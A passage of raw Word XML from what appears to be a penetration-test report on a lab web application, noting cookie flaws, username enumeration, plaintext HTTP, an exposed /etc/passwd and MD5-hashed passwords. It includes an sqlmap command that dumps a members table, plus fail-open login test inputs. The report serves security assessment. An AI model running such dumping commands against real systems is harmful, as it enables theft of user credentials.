        <w:t xml:space="preserve"> function on the website in the form of a forgotten password button. However, the </w:t>
      </w:r>
      <w:r w:rsidR="00017880">
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> does not run when clicked.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A8C0D8" w14:textId="77777777" w:rsidR="0018377B" w:rsidRDefault="00667747" w:rsidP="002F2AFA">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>The remember me function set up on the</w:t>
      </w:r>
      <w:r w:rsidR="002F2AFA">
        <w:t xml:space="preserve"> web application does not seem to </w:t>
      </w:r>
      <w:r w:rsidR="00DE1C75">
        <w:t>perform</w:t>
      </w:r>
      <w:r w:rsidR="002F2AFA">
        <w:t xml:space="preserve"> any function. This is in part because the cookies are persistent regardless of the submission of the remember me switch. </w:t>
      </w:r>
      <w:r w:rsidR="00AF55D9">
        <w:t>This was determined by closing the switch after logging in with remember me both set and not set. However, when a new session was then opened both still had the user logged in.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FAF456" w14:textId="77777777" w:rsidR="001E2ABA" w:rsidRDefault="00602A2F" w:rsidP="00602A2F">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
      <w:r>
        <w:t>Because t</w:t>
      </w:r>
      <w:r w:rsidR="001E2ABA">
        <w:t>here is no mechanism for impersonating another user in this web application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> this cannot be exploited.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7C6739" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRPr="0018377B" w:rsidRDefault="00BF3571" w:rsidP="00602A2F">
      <w:pPr>
        <w:ind w:left="705"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E90E9B3" w14:textId="77777777" w:rsidR="002F0399" w:rsidRDefault="002F0399" w:rsidP="002F0399">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc58836581"/>
      <w:r>
        <w:t xml:space="preserve">Test </w:t>
      </w:r>
      <w:r w:rsidR="00983656">
        <w:t>Credential Handling</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w14:paraId="38623266" w14:textId="77777777" w:rsidR="00017880" w:rsidRDefault="00602A2F" w:rsidP="00602A2F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>As stated repeatedly now, in section 3.2, t</w:t>
      </w:r>
      <w:r w:rsidR="00983656">
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r w:rsidR="00983656">
        <w:t>eb</w:t>
      </w:r>
      <w:r w:rsidR="009015D5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00983656">
        <w:t xml:space="preserve">application ensures that the same username </w:t>
      </w:r>
      <w:r w:rsidR="009015D5">
        <w:t>cannot</w:t>
      </w:r>
      <w:r w:rsidR="00983656">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009015D5" w:rsidRPr="00CB6F2E">
        <w:t xml:space="preserve">be </w:t>
      </w:r>
      <w:r w:rsidR="00983656" w:rsidRPr="00CB6F2E">
        <w:t xml:space="preserve">registered </w:t>
      </w:r>
      <w:r w:rsidR="009015D5" w:rsidRPr="00CB6F2E">
        <w:t>twice</w:t>
      </w:r>
      <w:r w:rsidR="00A40967">
        <w:t xml:space="preserve">. However, </w:t>
      </w:r>
      <w:r>
        <w:t>in preventing the registration of these emails</w:t>
      </w:r>
      <w:r w:rsidR="00413599">
        <w:t xml:space="preserve"> it states that:</w:t>
      </w:r>
      <w:r w:rsidR="0035621E" w:rsidRPr="0035621E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3439A4" w14:textId="77777777" w:rsidR="00413599" w:rsidRDefault="0035621E" w:rsidP="00017880">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="119C1544" wp14:editId="2BE891C5">
            <wp:extent cx="5943600" cy="605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5790"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3094001A" w14:textId="77777777" w:rsidR="0035621E" w:rsidRDefault="009015D5" w:rsidP="00B917D9">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>This is problematic as it allows for the enumeration of usernames</w:t>
      </w:r>
      <w:r w:rsidR="00602A2F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B917D9">
        <w:t>by submitting test cases shown is stage 3.2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D4AFC6" w14:textId="77777777" w:rsidR="00CB6F2E" w:rsidRDefault="00EF765E" w:rsidP="00CB6F2E">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There is only </w:t>
      </w:r>
      <w:r w:rsidRPr="00244940">
        <w:t>one credential</w:t>
      </w:r>
      <w:r w:rsidR="00244940">
        <w:t xml:space="preserve"> (Appendix </w:t>
      </w:r>
      <w:r w:rsidR="001D0209">
        <w:t>4.3</w:t>
      </w:r>
      <w:r w:rsidR="00244940">
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that is automatically generated for the user accounts and that is the account number. This is not involved in the login for the user so this cannot be exploited.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52681FF6" w14:textId="77777777" w:rsidR="00EA6881" w:rsidRPr="002F0399" w:rsidRDefault="00EA6881" w:rsidP="00EA6881">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>The website uses HTTP protocol which means that the packets sent to and from the website are not secured and are able to be captured by users.</w:t>
      </w:r>
      <w:r w:rsidR="00ED74EC">
        <w:t xml:space="preserve"> This was done using the Zap breakpoint function shown in </w:t>
      </w:r>
      <w:r w:rsidR="00ED74EC" w:rsidRPr="003C7416">
        <w:t>Appendix</w:t>
      </w:r>
      <w:r w:rsidR="003C7416">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EA2E30">
        <w:t>4.4</w:t>
      </w:r>
      <w:r w:rsidR="00ED74EC">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> This allows for the extraction of valuable or sensitive data including login details as can be seen below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9F02D2" w14:textId="77777777" w:rsidR="00EA6881" w:rsidRDefault="00EA6881" w:rsidP="00EA6881">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="142CF1A9" wp14:editId="1B3F91A0">
            <wp:extent cx="3876675" cy="19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190500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="123C260E" w14:textId="11A695BF" w:rsidR="00EA6881" w:rsidRDefault="00EA6881" w:rsidP="00EA6881">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>It also sends back a secret cookie</w:t>
      </w:r>
      <w:r w:rsidR="009572B4">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="009572B4" w:rsidRPr="009572B4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009572B4">
        <w:t>as noted in section 3.1,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D24B6B">
        <w:t xml:space="preserve">which </w:t>
      </w:r>
      <w:r>
        <w:t>was determined to include sensitive data. Namely, the username and password seen below. These where weakly encrypted using Hexadecimal and a standard 13 rotary cypher. These appear to serve no purpose and pose an unnecessary security risk to the web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288CB2FD" w14:textId="77777777" w:rsidR="00EA6881" w:rsidRDefault="00324BE7" w:rsidP="00EA6881">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidR="00EA6881" w:rsidRPr="002628FC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:1606137139</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="38BB6DD3" w14:textId="77777777" w:rsidR="00EA6881" w:rsidRPr="00983656" w:rsidRDefault="00EA6881" w:rsidP="009572B4">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r w:rsidRPr="003E7AB8">
        <w:t xml:space="preserve">By using the Zap application, a search was carried out </w:t>
      </w:r>
      <w:r w:rsidR="003E7AB8" w:rsidRPr="003E7AB8">
        <w:t>with a specific focus on</w:t>
      </w:r>
      <w:r w:rsidRPr="003E7AB8">
        <w:t xml:space="preserve"> any hidden or disabled content that would allow for the circumvention of client-side controls. However, none were detected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0971104C" w14:textId="77777777" w:rsidR="007C629E" w:rsidRDefault="0089272D" w:rsidP="003A6CCD">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The server does not properly secure the data stored because </w:t>
      </w:r>
      <w:r w:rsidRPr="00E9641C">
        <w:t>the ect/passwd</w:t>
      </w:r>
      <w:r w:rsidR="00E9641C">
        <w:t xml:space="preserve"> (Appendix </w:t>
      </w:r>
      <w:r w:rsidR="001D0209">
        <w:t>4.</w:t>
      </w:r>
      <w:r w:rsidR="00EA2E30">
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00E9641C">
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file is </w:t>
      </w:r>
      <w:r w:rsidR="000B71BE">
        <w:t>accessible</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This allows for </w:t>
      </w:r>
      <w:r w:rsidR="00983656">
        <w:t>the enumeration of all users active on the web server.</w:t>
      </w:r>
      <w:r w:rsidR="003A6CCD">
        <w:t xml:space="preserve"> In addition, </w:t>
      </w:r>
      <w:r w:rsidR="003A6CCD">
        <w:lastRenderedPageBreak/>
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidR="007C629E">
        <w:t xml:space="preserve">nce the </w:t>
      </w:r>
      <w:r w:rsidR="00BA5633">
        <w:t>7.1 stage had been carried out it was shown that SQLmap could be utalised. And by using this tool, it was possible to extract the data stored in the members table using the command below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="518AE284" w14:textId="77777777" w:rsidR="007C629E" w:rsidRDefault="007C629E" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC5E74">
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t>sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T members --dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5820B08D" w14:textId="77777777" w:rsidR="007C629E" w:rsidRDefault="007C629E" w:rsidP="007C629E">
      <w:pPr>
        <w:ind w:left="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70C26790" wp14:editId="6D0BE13E">
            <wp:extent cx="3824578" cy="851175"/>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5417"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3879746" cy="863453"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7921FFD0" w14:textId="77777777" w:rsidR="007C629E" w:rsidRDefault="007C629E" w:rsidP="007C629E">
      <w:pPr>
        <w:ind w:left="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7BCCF0F2" wp14:editId="004463A3">
            <wp:extent cx="3800724" cy="10076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181"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3901181" cy="1034289"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="285FD2AA" w14:textId="3ECB7882" w:rsidR="008D4F97" w:rsidRDefault="00BA5633" w:rsidP="00BA5633">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When </w:t>
      </w:r>
      <w:r w:rsidR="00D24B6B">
        <w:t xml:space="preserve">analysing </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">this </w:t>
      </w:r>
      <w:r w:rsidR="00E76FB5">
        <w:t>data,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it becomes clear that while the data was hashed, it was done using MD5</w:t>
      </w:r>
      <w:r w:rsidR="00E60020">
        <w:t xml:space="preserve"> as seen below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F218039" w14:textId="77777777" w:rsidR="00BA5633" w:rsidRDefault="00BA5633" w:rsidP="00E76FB5">
      <w:pPr>
        <w:ind w:left="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5AAF1118" wp14:editId="092FBE5C">
            <wp:extent cx="427672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00025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4340FAF3" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRDefault="00BF3571" w:rsidP="00E76FB5">
      <w:pPr>
        <w:ind w:left="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EE81A04" w14:textId="77777777" w:rsidR="00053516" w:rsidRDefault="00053516" w:rsidP="00053516">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc58836582"/>
      <w:r>
        <w:t>Authentication Logic</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w14:paraId="193AC7D9" w14:textId="77777777" w:rsidR="007E1ABE" w:rsidRDefault="00034004" w:rsidP="004025FD">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This section checks for </w:t>
      </w:r>
      <w:r w:rsidR="007E1ABE">
        <w:t>fail-open conditions w</w:t>
      </w:r>
      <w:r w:rsidR="004025FD">
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidR="007E1ABE">
        <w:t>ere incomplete or improper submissions receive a positive response. This is done by crafting a selection of requests that should trigger positive responses if the web application or server is not set up properly.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="817" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1592"/>
        <w:gridCol w:w="5085"/>
        <w:gridCol w:w="1828"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BF5F09" w14:paraId="15A00DEA" w14:textId="77777777" w:rsidTr="003E7AB8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1592" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="7F1192BD" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5085" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="603764BA" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>Packet</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1828" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="48202E61" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>Response</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF5F09" w14:paraId="63027A1E" w14:textId="77777777" w:rsidTr="003E7AB8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1592" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="38429935" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>Submit an Empty String</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5085" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6DFC5FDE" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004"/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1828" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="05F6AAC8" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>Negative</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF5F09" w14:paraId="1969615E" w14:textId="77777777" w:rsidTr="003E7AB8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1592" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7113CB54" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:bookmarkStart w:id="30" w:name="_Hlk58070646"/>
            <w:r>
              <w:t>Remove name and password</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5085" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1F6C4E14" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="002E2EC0" w:rsidP="00034004">
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07A67BDC" wp14:editId="18EA4F63">
                  <wp:extent cx="2009775" cy="152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775" cy="152400"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1828" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="18FC12C9" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>Positive, Login to default user</w:t>
            </w:r>
            <w:r w:rsidR="002E2EC0">
              <w:t xml:space="preserve"> who has blank username and password fields</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="30"/>
      <w:tr w:rsidR="00BF5F09" w14:paraId="4B1CAB18" w14:textId="77777777" w:rsidTr="003E7AB8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1592" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7AC91D66" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>Long</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5085" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1079D27C" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r w:rsidRPr="00FB7508">
              <w:t>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C8C9F69" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r w:rsidRPr="00FB7508">
              <w:t>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29CC5A1C" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r w:rsidRPr="00FB7508">
              <w:t>aaaaaaaaaaaaaaaaaaa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1828" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1FA9AB48" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>Negative</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF5F09" w14:paraId="0A37BB2D" w14:textId="77777777" w:rsidTr="003E7AB8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1592" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="25DC8B91" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>Numbers</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5085" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="18E2F6F8" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r w:rsidRPr="00034004">
              <w:t>11111</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1828" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="562951E6" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00034004" w:rsidP="00034004">
            <w:r>
              <w:t>Negative</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00034004" w14:paraId="27422789" w14:textId="77777777" w:rsidTr="003E7AB8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1592" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="17145FED" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00BF5F09" w:rsidP="00034004">
            <w:r>
              <w:t>Multiple parameters</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5085" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="03B0D1E1" w14:textId="77777777" w:rsidR="00BF5F09" w:rsidRDefault="00BF5F09" w:rsidP="00034004">
            <w:r>
              <w:t>Login=test&amp;Login=hacklab%40hacklab.com&amp;password</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="317062DB" w14:textId="77777777" w:rsidR="00034004" w:rsidRPr="00034004" w:rsidRDefault="00BF5F09" w:rsidP="00BF5F09">
            <w:r>
              <w:t>=&amp;Submit=Login</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1828" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3F8D354A" w14:textId="77777777" w:rsidR="00034004" w:rsidRDefault="00BF5F09" w:rsidP="00034004">
            <w:r>
              <w:t>Negative</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2FF36978" w14:textId="1EDAEEF1" w:rsidR="007E1ABE" w:rsidRDefault="007E1ABE" w:rsidP="004025FD">
      <w:pPr>
        <w:spacing w:before="120"/>
        <w:ind w:left="709"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">These responses suggest that the website and server are not vulnerable to fail-open conditions. This includes the one positive response which only triggered because there was a user with a blank username and password, not because </w:t>
      </w:r>
      <w:r w:rsidR="004025FD">
        <w:t>by</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> default </w:t>
      </w:r>
      <w:r w:rsidR="004025FD">
        <w:t xml:space="preserve">it </w:t>
      </w:r>
      <w:r w:rsidR="00A32685">
        <w:t>logged</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> into the first user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2821EB00" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRPr="00FB7508" w:rsidRDefault="00BF3571" w:rsidP="004025FD">
      <w:pPr>
        <w:spacing w:before="120"/>
        <w:ind w:left="709"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="384120A3" w14:textId="77777777" w:rsidR="00B85D70" w:rsidRDefault="00667747" w:rsidP="00667747">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="31" w:name="_Toc58836583"/>
      <w:r>
        <w:t>Exploit Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="31"/>
    </w:p>
    <w:p w14:paraId="358DEB8D" w14:textId="77777777" w:rsidR="00AF55D9" w:rsidRDefault="00EE04F4" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>Because</w:t>
      </w:r>
      <w:r w:rsidR="00AF55D9">
